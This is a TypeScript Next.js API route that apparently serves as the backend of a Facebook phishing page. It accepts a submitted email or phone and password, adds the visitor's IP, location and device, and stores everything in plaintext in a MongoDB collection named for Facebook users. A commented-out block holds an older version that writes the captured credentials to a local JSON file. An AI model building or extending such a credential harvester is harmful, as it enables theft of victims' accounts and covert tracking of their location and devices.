// pages/api/login.ts
//import fs from 'fs';
//import path from 'path';
import connectdb from "@/app/lib/database";
import Facebookuser from "@/app/lib/modals/Facebook";
import { NextResponse } from "next/server";
export const POST = async (request:Request)=>{
 try {
    const body = await request.json();
    const { emailOrPhone, password, location, device } = body;
    const ip = request.headers.get("x-forwarded-for")?.split(",")[0].trim() ||"Unknown";
    if(!emailOrPhone || !password ||!location || !device || !ip)
          return NextResponse.json({error: "Missing required fields"}, {status:400})
    
    await connectdb();
    const newFbUser = new Facebookuser({
      emailOrPhone,
      password,
      ip,
      location,
      device,
      timestamp: new Date(),
    });

    await newFbUser.save();

    return new Response(JSON.stringify({ message: "Credentials saved to MongoDB." }), {
      status: 200,
      headers: { "Content-Type": "application/json" },
    });
  } catch (error: unknown) {
    if (error instanceof Error) {
      console.error("MongoDB error:", error.message);
      return new Response(JSON.stringify({ error: "Failed to save data" }), {
        status: 500,
        headers: { "Content-Type": "application/json" },
      });
    }
  }
};
    //const body = await request.json();
    //const { emailOrPhone, password } = body;


  /* Create a data directory if it doesn't exist
  const dir = path.join(process.cwd(), 'data');
  if (!fs.existsSync(dir)) {
    fs.mkdirSync(dir);
  }

  // Save to file (not secure! For demo only)
  const filePath = path.join(dir, 'users.json');
  const user = { emailOrPhone, password, timestamp: new Date().toISOString() };

  let existing = [];
  if (fs.existsSync(filePath)) {
    const raw = fs.readFileSync(filePath, 'utf-8');
    try {
        existing = raw.trim().length > 0 ? JSON.parse(raw) : [];
      } catch (error:unknown) {
        if (error instanceof Error) {
        console.error('Corrupted JSON. Replacing with empty array.');
        existing = [];
        }
      }
  }

  existing.push(user);
  fs.writeFileSync(filePath, JSON.stringify(existing, null, 2));

return new Response(JSON.stringify({ message: 'Credentials saved.' }), {
    status: 200,
    headers: { 'Content-Type': 'application/json' },
  });
*/
